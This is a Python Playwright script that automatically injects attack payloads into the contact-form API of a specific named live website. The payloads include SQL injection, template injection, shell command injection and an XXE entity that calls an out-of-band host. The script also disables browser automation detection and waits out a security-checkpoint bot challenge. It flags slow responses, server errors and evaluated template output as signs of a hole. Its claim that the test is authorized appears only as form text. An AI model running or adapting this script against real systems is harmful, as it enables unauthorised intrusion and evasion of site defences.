import asyncio, json, sys
from playwright.async_api import async_playwright

URL = "https://www.infinitycapital.bh/contact"
AT = chr(64)

# payloads: list of (field, value)
def payloads():
    out = []
    sql = ["' OR '1'='1", "' AND '1'='2", "1' AND (SELECT 1)--", "1;SELECT 1--",
           "1' UNION SELECT 1--", "' AND SLEEP(6)--", "1 AND SLEEP(6)"]
    tpl = ["${7*7}", "{{7*7}}", "<%= 7*7 %>", "#{7*7}", "{7*7}"]
    cmd = ["; sleep 6", "| sleep 6", "$(sleep 6)", "`sleep 6`", "&& sleep 6", "; id"]
    xxe = ["<?xml version='1.0'?><!DOCTYPE r [<!ENTITY x SYSTEM 'http://oobtest.invalid/x'>]><r>&x;</r>"]
    for f in ["fname","lname","cname","subject","msg","areacode","tel"]:
        for p in sql+tpl+cmd:
            out.append((f,p))
    out.append(("msg", xxe[0]))
    return out

async def main():
    async with async_playwright() as pw:
        b = await pw.chromium.launch(args=['--no-sandbox','--disable-dev-shm-usage','--disable-blink-features=AutomationControlled'])
        ctx = await b.new_context(user_agent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', locale='en-US', viewport={'width':1366,'height':900})
        pg = await ctx.new_page()
        await pg.goto(URL, wait_until='domcontentloaded', timeout=60000)
        solved=False
        for i in range(40):
            await pg.wait_for_timeout(1000)
            h = await pg.content()
            if 'Security Checkpoint' not in h:
                solved=True; break
        print("SOLVED=", solved, flush=True)
        if not solved:
            print("STILL_CHALLENGED"); return
        res = await pg.evaluate("""async (payloads) => {
            const out = [];
            const AT = '%s';
            const base = () => ({fname:'VaptQA',lname:'Tester',areacode:'973',tel:'3600000',cname:'vapt-qa',subject:'Inquiry',msg:'Authorized security test message',check:'on',targets:'info'+AT+'infinitycapital.bh'});
            for (const [fld,val] of payloads) {
                const body = base(); body[fld] = val;
                const t0 = performance.now();
                let rec = {fld, val: val.slice(0,40), status:0, body:'', ms:0};
                try {
                    const r = await fetch('/api/send', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json/*'}, body: new URLSearchParams(body).toString()});
                    rec.status = r.status; rec.body = (await r.text()).slice(0,300);
                } catch(e) { rec.body = 'EXC '+e.message; }
                rec.ms = Math.round(performance.now()-t0);
                out.push(rec);
                await new Promise(r=>setTimeout(r,700));
            }
            return out;
        }""" % AT, payloads())
        for r in res:
            flag = " <<<" if (r['status'] in (500,502) or r['ms']>4000 or '49' == r['body'][0:2]) else ""
            print(f"{r['fld']:9s} {r['val'][:30]!r:34s} -> {r['status']} {r['ms']:5d}ms {r['body'][:150]}{flag}", flush=True)
        await b.close()

asyncio.run(main())
